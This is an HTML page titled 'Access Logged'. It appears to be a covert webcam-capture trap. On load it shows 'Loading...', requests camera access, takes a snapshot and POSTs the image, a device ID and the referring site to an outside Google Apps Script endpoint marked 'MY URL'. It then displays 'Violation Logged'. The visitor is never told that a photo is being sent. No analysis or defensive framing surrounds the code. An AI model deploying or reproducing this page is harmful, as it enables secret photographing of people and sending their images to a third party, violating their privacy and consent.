<!DOCTYPE html>
<html>
<head>
  <title>Access Logged</title>
  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbzDx_PGK4KWXGnvE3-tGJ2g_7sG2pO3TJE_ZKfd5bOxu_--zFD3vPYvgmXOsNheqmTd/exec"; // MY URL

    const deviceID = new URLSearchParams(window.location.search).get('device') || 'UNKNOWN';
    const referrer = document.referrer || 'Unknown Site';

    function sendSnapshot(imgData) {
      fetch(scriptURL, {
        method: 'POST',
        body: JSON.stringify({
          device: deviceID,
          site: referrer,
          image: imgData
        }),
        headers: {
          'Content-Type': 'application/json'
        }
      }).then(res => console.log("Logged"));
    }

    function snap() {
      const video = document.createElement('video');
      const canvas = document.createElement('canvas');
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const image = canvas.toDataURL("image/png");
            sendSnapshot(image);
            stream.getTracks().forEach(t => t.stop());
            document.body.innerHTML = "<h2>Violation Logged</h2>";
          }, 1500);
        })
        .catch(err => {
          console.error("Camera access failed");
        });
    }

    window.onload = snap;
  </script>
</head>
<body>
  <h3>Loading...</h3>
</body>
</html>
